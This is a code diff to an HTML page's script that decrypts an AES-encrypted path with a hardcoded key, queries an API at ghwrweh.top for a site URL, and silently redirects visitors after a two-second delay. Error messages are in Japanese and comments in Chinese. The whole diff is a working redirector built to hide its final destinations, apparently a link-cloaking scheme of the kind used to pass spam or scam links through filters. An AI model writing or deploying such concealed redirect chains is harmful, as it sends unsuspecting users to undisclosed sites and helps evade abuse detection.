@@ -22,31 +22,47 @@
   <script>
     const AES_KEY = "5Ctianyoumabiiii";
 
-    // 获取路径中的 ID
-    let id = location.pathname.split("/").filter(Boolean).pop();
+    // 从路径中提取加密内容
+    const encryptedPath = location.pathname.split("/").filter(Boolean).pop();
 
-    if (!id) {
-      document.body.innerHTML += "<p style='color:red;'>IDが見つかりません。</p>";
+    if (!encryptedPath) {
+      document.body.innerHTML += "<p style='color:red;'>リンクIDが存在しません。</p>";
     } else {
-      fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id))
-        .then(r => r.json())
-        .then(data => {
-          const enc = data?.data?.siteUrl;
-          if (enc) {
-            decryptAES(enc).then(url => {
-              if (url) {
-                setTimeout(() => location.href = url, 3000);
-              } else {
-                document.body.innerHTML += "<p style='color:red;'>復号に失敗しました。</p>";
-              }
-            });
-          } else {
-            document.body.innerHTML += "<p style='color:red;'>リダイレクト先が見つかりません。</p>";
+      decryptAES(encryptedPath).then(decryptedUrl => {
+        if (!decryptedUrl) {
+          document.body.innerHTML += "<p style='color:red;'>復号に失敗しました。</p>";
+          return;
+        }
+
+        try {
+          const urlObj = new URL(decryptedUrl);
+          const siteName = urlObj.searchParams.get("siteName") || "";  // 例：https://domain.com?siteName=abc123
+
+          if (!siteName) {
+            // 若没有siteName参数，直接跳转
+            setTimeout(() => location.href = decryptedUrl, 2000);
+            return;
           }
-        })
-        .catch(() => {
-          document.body.innerHTML += "<p style='color:red;'>API取得時にエラーが発生しました。</p>";
-        });
+
+          fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(siteName))
+            .then(res => res.json())
+            .then(apiData => {
+              const finalUrl = apiData?.data?.siteUrl;
+              if (finalUrl) {
+                setTimeout(() => location.href = finalUrl, 2000);
+              } else {
+                document.body.innerHTML += "<p style='color:red;'>APIでリダイレクト先が見つかりません。</p>";
+              }
+            })
+            .catch(() => {
+              document.body.innerHTML += "<p style='color:red;'>API呼び出しエラー。</p>";
+            });
+
+        } catch {
+          // 解密后不是 URL 格式
+          document.body.innerHTML += "<p style='color:red;'>URL形式ではありません。</p>";
+        }
+      });
     }
 
     async function decryptAES(encText) {
